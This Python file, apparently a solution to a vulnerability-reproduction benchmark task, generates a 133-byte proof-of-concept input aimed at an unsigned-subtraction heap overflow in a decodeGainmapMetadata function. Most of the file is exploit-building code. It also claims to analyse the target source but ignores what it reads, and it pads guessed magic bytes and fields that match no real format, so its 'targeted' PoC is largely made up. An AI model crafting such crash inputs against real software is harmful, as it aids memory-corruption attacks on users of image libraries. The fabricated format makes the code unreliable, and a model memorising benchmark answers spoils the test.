import os
import struct
import tarfile
import tempfile
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for files containing the vulnerable function
            target_files = []
            for root, _, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c') or file.endswith('.cpp'):
                        filepath = os.path.join(root, file)
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            if 'decodeGainmapMetadata' in f.read():
                                target_files.append(filepath)
            
            if not target_files:
                # If we can't find the exact function, create a generic PoC
                # based on typical unsigned subtraction overflow patterns
                return self._create_generic_poc()
            
            # Analyze the first found file to understand the structure
            return self._analyze_and_create_poc(target_files[0])
    
    def _analyze_and_create_poc(self, filepath: str) -> bytes:
        """Analyze the source file and create a targeted PoC."""
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Look for patterns that indicate unsigned subtraction
        # Common pattern: (a - b) where both are unsigned
        # We'll create a PoC that makes b > a to cause wrap-around
        
        # Create a minimal PoC based on common patterns
        # The PoC structure will be:
        # 1. Header/signature (if needed)
        # 2. Values that trigger unsigned overflow
        
        # For a generic gainmap metadata structure, we'll create:
        # - Magic/signature bytes
        # - Version field
        # - Two size/count fields where first < second
        
        poc = bytearray()
        
        # Add a plausible header (4 bytes magic)
        poc.extend(b'GMAP')
        
        # Version field (1 byte)
        poc.append(1)
        
        # Add two unsigned 32-bit values where first < second
        # This will cause (first - second) to wrap to large value
        # when interpreted as unsigned
        
        # First value: small (e.g., 1)
        poc.extend(struct.pack('<I', 1))
        
        # Second value: larger than first, but not too large
        # to avoid early validation checks
        poc.extend(struct.pack('<I', 100))
        
        # Add metadata fields that might be expected
        # These are filler bytes to reach the target length
        # and make the file look plausible
        
        # Add minimum and maximum gain values (8 bytes each as float)
        poc.extend(struct.pack('<f', 0.5))
        poc.extend(struct.pack('<f', 2.0))
        
        # Add gamma value (4 bytes)
        poc.extend(struct.pack('<f', 1.0))
        
        # Add offset values that might be read
        poc.extend(struct.pack('<I', 0))
        poc.extend(struct.pack('<I', 0))
        
        # Pad to target length of 133 bytes
        target_length = 133
        if len(poc) < target_length:
            poc.extend(b'\x00' * (target_length - len(poc)))
        elif len(poc) > target_length:
            poc = poc[:target_length]
        
        return bytes(poc)
    
    def _create_generic_poc(self) -> bytes:
        """Create a generic PoC for unsigned subtraction overflow."""
        # Build a PoC that's likely to trigger heap buffer overflow
        # in decodeGainmapMetadata() function
        
        poc = bytearray()
        
        # Common image/metadata header pattern
        poc.extend(b'\x89GMD')  # Magic bytes
        
        # Version and flags
        poc.extend(b'\x01\x00')  # Version 1, flags 0
        
        # Critical part: two unsigned values where first < second
        # These could be width/height, count/size, etc.
        
        # First unsigned 32-bit value (little endian)
        poc.extend(struct.pack('<I', 1))  # Small value
        
        # Second unsigned 32-bit value (must be > first)
        poc.extend(struct.pack('<I', 0xFFFFFFFF))  # Very large value
        
        # Additional metadata fields
        poc.extend(struct.pack('<f', 1.0))  # gamma
        poc.extend(struct.pack('<f', 0.5))  # min_gain
        poc.extend(struct.pack('<f', 4.0))  # max_gain
        
        # More filler to reach the target length
        # and trigger different code paths
        remaining = 133 - len(poc)
        if remaining > 0:
            # Add pattern that might be interpreted as array sizes
            poc.extend(struct.pack('<I', 0x100))  # Another size field
            remaining -= 4
        
        # Fill remaining bytes with nulls
        if remaining > 0:
            poc.extend(b'\x00' * remaining)
        
        # Ensure exact length of 133 bytes
        return bytes(poc[:133])